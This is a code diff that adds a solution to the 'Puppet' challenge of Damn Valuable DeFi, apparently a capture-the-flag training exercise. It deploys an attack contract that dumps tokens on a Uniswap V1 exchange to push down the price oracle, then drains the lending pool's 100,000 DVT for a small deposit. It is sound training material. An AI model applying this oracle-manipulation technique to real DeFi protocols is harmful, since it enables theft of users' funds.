@@ -7,6 +7,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
+import {Attack} from "./Attack.sol";
 
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -92,6 +93,15 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
+        Attack attack = new Attack(address(lendingPool), recovery, address(uniswapV1Exchange), address(token));
+        
+        token.transfer(address(attack), PLAYER_INITIAL_TOKEN_BALANCE);
+        // 1,000 DVT 스왑 요청
+        attack.swap();
+
+        uint256 depositRequired = lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        // PuppetPool에서 100,000 DVT 빌리기
+        attack.drain{value : depositRequired}();
         
     }
 
